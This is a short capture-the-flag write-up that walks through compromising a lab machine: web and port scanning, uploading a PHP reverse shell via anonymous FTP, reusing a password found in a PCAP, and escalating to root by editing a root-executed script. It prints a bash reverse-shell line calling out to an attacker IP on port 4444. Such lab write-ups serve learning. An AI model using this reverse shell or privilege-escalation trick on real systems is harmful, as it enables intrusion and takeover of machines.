Looks like a simple website.

To get started, lets run NMAP and GOBUSTER

  GOBuster got a hit : http://10.10.105.59/files/notice.txt

```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
name "Maya" is mentioned


** NMAP
  Shows FTP Server. We should try to connect to that.


I can Anonymous login to the FTP, lets see if we can upload it.

Uploaded a Reverse shell PHP with FTP, executed it and now logged in as www-data


I find recipe.txt on the "/" giving me the secret ingredient.
```
cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```


I found the Suspicious PCAP file and by using "Follow TCP stream" i found it was using a reverse shell to login;''
It was using this password for an attempt to login as lennie, lets see if it works
```
c4ntg3t3n0ughsp1c3
```
Instead of upgrading my Reverse shell, i opted to just SSH into the machine

``
lennie@<ip>
``

I notice that in the `/home/lennie/scripts` folder there is some .sh file owned by root who calls /etc/print.sh (for no reason).

/etc/print.sh is owned by lennie, so that allows me to make adjustments and they will be run BY root. (So as root), here i make a reverse shell with TCP with bash
```
#!/bin/bash
/bin/bash -l > /dev/tcp/10.14.12.121/4444 0<&1 2>&1
echo "Done!"
```
